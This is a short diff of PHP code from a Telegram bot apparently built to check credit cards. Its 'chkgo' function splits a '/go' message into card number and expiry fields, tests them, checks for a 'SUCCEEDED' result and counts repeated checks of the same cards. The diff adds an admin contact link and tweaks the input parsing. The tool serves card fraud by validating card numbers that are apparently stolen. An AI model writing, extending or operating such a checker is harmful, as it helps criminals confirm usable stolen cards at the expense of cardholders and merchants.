@@ -3,9 +3,9 @@
 function chkgo($chatId, $message, $message_id) {
 
 if (preg_match('/^(!|\/|\.)go/', $message)) {
-//$lista = preg_replace('/\s+/', '', $lista);
+
 $lista = substr($message, 4);
-//$i = preg_split('/[|:| ]/', $lista);
+
 $i = preg_split('/[|:|\/ ]/', $lista);
 $cc    = trim($i[0]);
 $mes   = trim($i[1]);
@@ -171,7 +171,9 @@ if ($respo == "SUCCEEDED"){
 }
 // Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
 $logo = "<a href='http://t.me/XNazunaBot'>[↯]</a>";
-unlink('cookie.txt');
+$admin = "<a href='t.me/rigo_jz'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>";
+	
+	unlink('cookie.txt');
 //\n".$logo." 𝐑𝐞𝐭𝐫𝐢𝐞𝐬: ".$retri."
 
 $retri = handleComando($card); //Checa cuntas veces se calo la misma ccs//
